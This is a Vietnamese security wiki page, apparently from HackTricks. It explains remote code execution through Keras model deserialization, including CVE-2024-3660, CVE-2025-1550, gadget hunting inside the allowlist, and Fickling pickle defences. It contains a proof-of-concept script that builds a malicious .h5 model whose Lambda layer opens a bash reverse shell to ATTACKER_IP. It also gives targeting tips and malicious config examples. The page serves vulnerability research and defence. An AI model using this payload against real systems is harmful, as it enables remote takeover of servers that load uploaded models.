# RCE qua Deserialization Model Keras và Săn tìm Gadget

{{#include ../../banners/hacktricks-training.md}}

Trang này tóm tắt các kỹ thuật khai thác thực tế nhằm vào pipeline deserialization của model Keras, giải thích nội bộ và bề mặt tấn công của định dạng .keras gốc, đồng thời cung cấp bộ công cụ cho nhà nghiên cứu để tìm Model File Vulnerabilities (MFVs) và gadget sau khi vá.

## Nội bộ định dạng model .keras

Một file .keras là một kho lưu trữ ZIP chứa tối thiểu:<sup>[[1]](#references)</sup>
- metadata.json – thông tin chung (ví dụ: phiên bản Keras)
- config.json – kiến trúc model (bề mặt tấn công chính)
- model.weights.h5 – các trọng số ở định dạng HDF5

config.json điều khiển quá trình deserialization đệ quy: Keras import module, phân giải class/function và tái tạo layer/object từ các dictionary do attacker kiểm soát.<sup>[[1]](#references)</sup>

Ví dụ về object Dense layer:

```json
{
  "module": "keras.layers",
  "class_name": "Dense",
  "config": {
    "units": 64,
    "activation": {
      "module": "keras.activations",
      "class_name": "relu"
    },
    "kernel_initializer": {
      "module": "keras.initializers",
      "class_name": "GlorotUniform"
    }
  }
}
```

Deserialization thực hiện:<sup>[[1]](#references)</sup>
- Import module và phân giải symbol từ các khóa module/class_name
- Gọi from_config(...) hoặc constructor với kwargs do kẻ tấn công kiểm soát
- Đệ quy vào các object lồng nhau (activations, initializers, constraints, v.v.)

Trong lịch sử, điều này tạo ra ba primitive cho kẻ tấn công tạo config.json:<sup>[[1]](#references)</sup>
- Kiểm soát các module được import
- Kiểm soát các class/function được phân giải
- Kiểm soát kwargs được truyền vào constructor/from_config

## CVE-2024-3660 – RCE bằng bytecode của Lambda-layer

Nguyên nhân gốc:
- Quá trình deserialization Lambda kiểu cũ dựng lại một hàm Python từ code đã marshal do kẻ tấn công kiểm soát: `func_load()` giải mã payload từ base64, gọi `marshal.loads()` và tạo một `FunctionType`. Bytecode của hàm được tạo sẽ chạy khi Lambda được gọi, còn các loader trước phiên bản 2.13 bị ảnh hưởng không thực thi kiểm tra safe-mode cho các định dạng kiểu cũ.<sup>[[3]](#references)[[16]](#references)[[17]](#references)[[18]](#references)</sup>

Trong archive Keras v3 gốc, hàm Lambda được biểu diễn dưới dạng object `__lambda__`, trong đó trường `code` chứa code đã marshal và mã hóa base64:<sup>[[17]](#references)[[18]](#references)</sup>

```json
{
  "module": "keras.layers",
  "class_name": "Lambda",
  "config": {
    "name": "exploit_lambda",
    "function": {
      "class_name": "__lambda__",
      "config": {
        "code": "<base64(marshal.dumps(function.__code__))>",
        "defaults": null,
        "closure": null
      }
    }
  }
}
```

Biện pháp giảm thiểu:
- Keras mặc định áp dụng `safe_mode=True` cho định dạng Keras v3 gốc. Các lambda Python được serialize trong `Lambda` sẽ bị chặn, trừ khi người dùng chủ động tắt bảo vệ bằng `safe_mode=False`; cơ chế bảo vệ này không áp dụng tương tự cho các định dạng cũ.<sup>[[1]](#references)[[16]](#references)[[17]](#references)</sup>

Ghi chú:
- Các định dạng cũ (bản lưu HDF5 đời trước) hoặc codebase cũ có thể không áp dụng các kiểm tra hiện đại, nên những cuộc tấn công kiểu “downgrade” vẫn có thể xảy ra khi nạn nhân dùng loader cũ.

## CVE-2025-1550 – Import module tùy ý trong Keras 3.0.0–3.8.x

Nguyên nhân gốc:
- `_retrieve_class_or_fn` dùng `importlib.import_module(module)` với chuỗi module do attacker kiểm soát trong `config.json`.
- Tác động: Một archive `.keras` được tạo có chủ đích có thể khiến `Model.load_model()` import các module và function Python do attacker lựa chọn, gây ra tác dụng phụ tại thời điểm import và nhận các đối số do attacker kiểm soát, ngay cả khi `safe_mode=True`.<sup>[[1]](#references)[[4]](#references)</sup>

Ý tưởng khai thác:

```json
{
  "module": "maliciouspkg",
  "class_name": "Danger",
  "config": {"arg": "val"}
}
```

Các cải tiến bảo mật (Keras ≥ 3.9):<sup>[[1]](#references)[[2]](#references)</sup>
- Allowlist module: chỉ cho phép import từ các module thuộc hệ sinh thái chính thức: keras, keras_hub, keras_cv, keras_nlp
- Mặc định bật safe mode: safe_mode=True chặn việc tải hàm đã tuần tự hóa không an toàn trong Lambda
- Kiểm tra kiểu cơ bản: các đối tượng được giải tuần tự phải khớp với kiểu dự kiến

## Khai thác thực tế: TensorFlow-Keras HDF5 (.h5) Lambda RCE

Các bản triển khai TensorFlow-Keras cũ có thể vẫn chấp nhận tệp model HDF5 (`.h5`). Nếu kẻ tấn công có thể tải lên một model mà máy chủ sau đó sẽ tải hoặc chạy suy luận, loader bị ảnh hưởng có thể giải tuần tự một Lambda layer chứa mã Python do kẻ tấn công kiểm soát, rồi thực thi mã đó trong quy trình xử lý model của ứng dụng.<sup>[[3]](#references)[[7]](#references)[[16]](#references)</sup>

PoC tối giản để tạo một tệp .h5 độc hại có Lambda thực thi reverse shell khi mục tiêu gọi model:

```python
import tensorflow as tf

def exploit(x):
    import os
    os.system("bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1'")
    return x

m = tf.keras.Sequential()
m.add(tf.keras.layers.Input(shape=(64,)))
m.add(tf.keras.layers.Lambda(exploit))
m.compile()
m.save("exploit.h5")  # legacy HDF5 container
```

Ghi chú và mẹo về độ tin cậy:
- Điểm kích hoạt khác nhau tùy định dạng và quy trình; bài viết được dẫn đã ghi nhận payload thực thi hai lần trong quá trình dự đoán. Hãy xem các tác dụng phụ là có thể lặp lại và thiết kế payload sao cho idempotent.<sup>[[7]](#references)</sup>
- Ghim phiên bản: khớp phiên bản TF/Keras/Python của nạn nhân để tránh sai lệch trong quá trình tuần tự hóa. Ví dụ, tạo artifact bằng Python 3.8 với TensorFlow 2.13.1 nếu đó là phiên bản mục tiêu sử dụng.<sup>[[7]](#references)</sup>
- Tái tạo môi trường nhanh:

```dockerfile
FROM python:3.8-slim
RUN pip install tensorflow-cpu==2.13.1
```

- Validation: payload lành tính như `os.system("ping -c 1 YOUR_IP")` giúp xác nhận việc thực thi (ví dụ: quan sát ICMP bằng tcpdump) trước khi chuyển sang reverse shell.<sup>[[7]](#references)</sup>

## Bề mặt gadget sau khi vá bên trong allowlist

Ngay cả với Keras module allowlist và safe mode, các callable được cho phép vẫn có thể tạo ra side effect. Ví dụ, `keras.utils.get_file` tải xuống một URL và ghi tệp vào vị trí cache đã cấu hình, khiến nó trở thành ứng viên để phân tích gadget.<sup>[[1]](#references)[[19]](#references)</sup>

Cấu hình Lambda ứng viên (xác thực chữ ký gọi trong một thử nghiệm được kiểm soát):

```json
{
  "module": "keras.layers",
  "class_name": "Lambda",
  "config": {
    "name": "dl",
    "function": {
      "module": "keras.utils",
      "class_name": "get_file",
      "config": null,
      "registered_name": null
    },
    "arguments": {
      "origin": "https://example.com/artifact.bin",
      "cache_dir": "/tmp/keras-cache"
    }
  }
}
```

Hạn chế quan trọng:
- `Lambda.call()` luôn truyền input của model làm đối số vị trí đầu tiên và `arguments` đã cấu hình dưới dạng đối số từ khóa. Với `get_file`, giá trị vị trí đó sẽ điền vào `fname`; sự không khớp giữa tensor và path có thể khiến candidate này thất bại trước khi tải xuống, nên đây không phải là gadget chắc chắn hoạt động.<sup>[[1]](#references)[[16]](#references)[[19]](#references)</sup>

## ML pickle import allowlisting cho các model AI/ML (Fickling)

Nhiều định dạng model AI/ML (PyTorch `.pt`/`.pth`/`.ckpt`, artifact joblib/scikit-learn và các định dạng Python-native khác) nhúng dữ liệu Python pickle. Nhánh Keras Lambda cũ ở trên dùng bytecode hàm đã marshal thay thế, nên đây là một rủi ro deserialization riêng. Các opcode của pickle có thể gọi hành vi do attacker kiểm soát trong quá trình deserialization, bao gồm sửa đổi model hoặc RCE; các scanner đơn giản có thể bỏ sót những import nguy hiểm mới hoặc chưa được liệt kê.<sup>[[7]](#references)[[8]](#references)[[14]](#references)[[18]](#references)</sup>

Một biện pháp phòng thủ fail-closed thiết thực là hook deserializer pickle của Python và chỉ cho phép một tập hợp import liên quan đến ML đã được rà soát khi unpickling. Fickling của Trail of Bits triển khai chính sách này và cung cấp allowlist import ML được tuyển chọn từ hàng nghìn pickle công khai trên Hugging Face.<sup>[[8]](#references)[[13]](#references)</sup>

Mô hình bảo mật cho các import “an toàn” (các nhận định rút ra từ nghiên cứu và thực tiễn): các symbol được pickle sử dụng phải đồng thời đáp ứng những điều sau:<sup>[[8]](#references)</sup>
- Không thực thi code hoặc gây ra việc thực thi (không có code object đã biên dịch/mã nguồn, gọi shell, hook, v.v.)
- Không đọc/ghi các attribute hoặc item tùy ý
- Không import hoặc lấy tham chiếu đến các Python object khác từ pickle VM
- Không kích hoạt bất kỳ deserializer thứ cấp nào (ví dụ: marshal, pickle lồng nhau), kể cả gián tiếp

Bật các biện pháp bảo vệ của Fickling càng sớm càng tốt khi khởi động process để mọi thao tác tải pickle do framework thực hiện (`torch.load`, `joblib.load`, v.v.) đều được kiểm tra:<sup>[[9]](#references)</sup>

```python
import fickling
# Sets global hooks on the stdlib pickle module
fickling.hook.activate_safe_ml_environment()
```

Mẹo vận hành:
- Bạn có thể tạm thời vô hiệu hóa/kích hoạt lại các hooks khi cần:<sup>[[9]](#references)</sup>

```python
fickling.hook.deactivate_safe_ml_environment()
# ... load fully trusted files only ...
fickling.hook.activate_safe_ml_environment()
```

- Nếu một model đã biết là an toàn bị chặn, hãy mở rộng allowlist cho môi trường của bạn sau khi xem xét các symbol:<sup>[[9]](#references)</sup>

```python
fickling.hook.activate_safe_ml_environment(also_allow=[
    "package.subpackage.safe_symbol",
    "another.safe.import",
])
```

- Fickling cũng cung cấp các runtime guard tổng quát nếu bạn muốn kiểm soát chi tiết hơn:<sup>[[9]](#references)</sup>
  - fickling.always_check_safety() để bắt buộc kiểm tra mọi lần pickle.load()
  - with fickling.check_safety(): để áp dụng kiểm tra trong phạm vi cụ thể
  - fickling.load(path) / fickling.is_likely_safe(path) để kiểm tra riêng từng lần

- Ưu tiên các định dạng model không dùng pickle khi có thể (ví dụ: SafeTensors).<sup>[[15]](#references)</sup> Nếu phải chấp nhận pickle, hãy chạy loader với quyền tối thiểu, không cho phép kết nối mạng ra ngoài và thực thi allowlist.

Chiến lược ưu tiên allowlist này đã được chứng minh là chặn các đường khai thác ML pickle phổ biến mà vẫn duy trì khả năng tương thích cao. Trong benchmark của ToB, Fickling phát hiện 100% tệp độc hại tổng hợp và cho phép khoảng 99% tệp sạch từ các repo Hugging Face hàng đầu.<sup>[[8]](#references)[[10]](#references)</sup>


## Bộ công cụ nhà nghiên cứu

1) Khám phá gadget có hệ thống trong các module được phép

Liệt kê các callable tiềm năng trong keras, keras_nlp, keras_cv, keras_hub và ưu tiên những callable có tác dụng phụ lên file/network/process/env.<sup>[[1]](#references)</sup>

<details>
<summary>Liệt kê các callable có khả năng nguy hiểm trong các module Keras nằm trong allowlist</summary>

```python
import importlib, inspect, pkgutil

ALLOWLIST = ["keras", "keras_nlp", "keras_cv", "keras_hub"]

seen = set()

def iter_modules(mod):
    if not hasattr(mod, "__path__"):
        return
    for m in pkgutil.walk_packages(mod.__path__, mod.__name__ + "."):
        yield m.name

candidates = []
for root in ALLOWLIST:
    try:
        r = importlib.import_module(root)
    except Exception:
        continue
    for name in iter_modules(r):
        if name in seen:
            continue
        seen.add(name)
        try:
            m = importlib.import_module(name)
        except Exception:
            continue
        for n, obj in inspect.getmembers(m):
            if inspect.isfunction(obj) or inspect.isclass(obj):
                sig = None
                try:
                    sig = str(inspect.signature(obj))
                except Exception:
                    pass
                doc = (inspect.getdoc(obj) or "").lower()
                text = f"{name}.{n} {sig} :: {doc}"
                # Heuristics: look for I/O or network-ish hints
                if any(x in doc for x in ["download", "file", "path", "open", "url", "http", "socket", "env", "process", "spawn", "exec"]):
                    candidates.append(text)

print("\n".join(sorted(candidates)[:200]))
```

</details>

2) Kiểm thử giải tuần tự trực tiếp (không cần archive .keras)

Truyền các dict được tạo có chủ đích trực tiếp vào bộ giải tuần tự của Keras để tìm hiểu các tham số được chấp nhận và quan sát tác dụng phụ.<sup>[[1]](#references)</sup>

```python
import keras

cfg = {
  "module": "keras.layers",
  "class_name": "Lambda",
  "config": {
    "name": "probe",
    "function": {
      "module": "keras.utils",
      "class_name": "get_file",
      "config": null,
      "registered_name": null
    },
    "arguments": {
      "origin": "https://example.com/x",
      "cache_dir": "/tmp/keras-cache"
    }
  }
}

layer = keras.saving.deserialize_keras_object(cfg, safe_mode=True)  # Observe behavior
```

3) Kiểm tra xuyên phiên bản và định dạng

Keras tồn tại trong nhiều codebase/era với các biện pháp bảo vệ khác nhau:<sup>[[1]](#references)</sup>
- TensorFlow built-in Keras: tensorflow/python/keras (legacy, dự kiến sẽ bị xóa)
- tf-keras: được duy trì riêng
- Multi-backend Keras 3 (chính thức): giới thiệu định dạng .keras gốc

Lặp lại các bài kiểm tra trên nhiều codebase và định dạng (.keras so với HDF5 legacy) để phát hiện hồi quy hoặc thiếu biện pháp bảo vệ.

## References

- [1] [Tìm kiếm lỗ hổng trong quá trình giải tuần tự hóa model Keras (blog huntr)](https://blog.huntr.com/hunting-vulnerabilities-in-keras-model-deserialization)
- [2] [Keras PR #20751 – Đã thêm kiểm tra vào serialization](https://github.com/keras-team/keras/pull/20751)
- [3] [CVE-2024-3660 – RCE khi giải tuần tự hóa Lambda của Keras](https://nvd.nist.gov/vuln/detail/CVE-2024-3660)
- [4] [CVE-2025-1550 – Import module tùy ý trong Keras (≤ 3.8)](https://nvd.nist.gov/vuln/detail/CVE-2025-1550)
- [5] [Báo cáo huntr – import tùy ý #1](https://huntr.com/bounties/135d5dcd-f05f-439f-8d8f-b21fdf171f3e)
- [6] [Báo cáo huntr – import tùy ý #2](https://huntr.com/bounties/6fcca09c-8c98-4bc5-b32c-e883ab3e4ae3)
- [7] [HTB Artificial – RCE qua Lambda trong TensorFlow .h5 để chiếm quyền root](https://0xdf.gitlab.io/2025/10/25/htb-artificial.html)
- [8] [Blog Trail of Bits – Trình quét file pickle AI/ML mới của Fickling](https://blog.trailofbits.com/2025/09/16/ficklings-new-ai/ml-pickle-file-scanner/)
- [9] [Fickling – Bảo vệ môi trường AI/ML (README)](https://github.com/trailofbits/fickling#securing-aiml-environments)
- [10] [Corpus benchmark quét pickle của Fickling](https://github.com/trailofbits/fickling/tree/master/pickle_scanning_benchmark)
- [11] [Picklescan](https://github.com/mmaitre314/picklescan)
- [12] [ModelScan](https://github.com/protectai/modelscan)
- [13] [model-unpickler](https://github.com/goeckslab/model-unpickler)
- [14] [Bối cảnh về các cuộc tấn công Sleepy Pickle](https://blog.trailofbits.com/2024/06/11/exploiting-ml-models-with-pickle-file-attacks-part-1/)
- [15] [Dự án SafeTensors](https://github.com/safetensors/safetensors)
- [16] [CERT/CC VU#253266 – Lambda Layers của Keras 2 cho phép chèn mã tùy ý](https://kb.cert.org/vuls/id/253266)
- [17] [Mã nguồn lớp Lambda của Keras (v3.10.0)](https://github.com/keras-team/keras/blob/v3.10.0/keras/src/layers/core/lambda_layer.py)
- [18] [Mã nguồn tiện ích Python của Keras (v3.10.0)](https://github.com/keras-team/keras/blob/v3.10.0/keras/src/utils/python_utils.py)
- [19] [API `get_file` của Keras](https://keras.io/api/utils/python_utils/#get_file-function)
{{#include ../../banners/hacktricks-training.md}}
